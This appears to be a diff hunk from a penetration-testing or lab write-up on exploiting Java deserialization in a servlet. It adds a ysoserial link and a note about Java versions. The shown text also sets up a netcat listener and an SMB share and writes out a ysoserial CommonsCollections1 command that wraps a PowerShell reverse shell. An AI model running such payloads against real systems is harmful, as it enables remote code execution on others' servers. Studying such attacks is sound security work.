@@ -41,7 +41,9 @@ public class CustomFieldsFeedServlet extends javax.servlet.http.HttpServlet
 }
 ```
 
-We’ll use Ysoserial to generate our payload for the application. For the gadget type, we can use CommonCollections1 as the default — although brute-forcing some of the common ones would work too. Since Ysoserial’s CommonCollections doesn’t work in Java, we can use https://github.com/frohoff/ysoserial/issues/203 to swap between Java versions. Once we’re done, we simply setup our netcat listener and SMB share. 
+We’ll use Ysoserial to generate our payload for the application. For the gadget type, we can use CommonCollections1 as the default — although brute-forcing some of the common ones would work too. Since Ysoserial’s CommonCollections doesn’t work in Java, we can use [https://github.com/frohoff/ysoserial/issues/203#issuecomment-1581591710](https://github.com/frohoff/ysoserial/issues/203#issuecomment-1581591710) to swap between Java versions. Remember, since Burp runs on Java, it’s important to reset our Java installation back to the default. 
+
+Once we’re done, we simply setup our netcat listener and SMB share. 
 
 ```bash
 java -jar ysoserial-all.jar CommonsCollections1 'powershell -e <reverse shell>' > payload
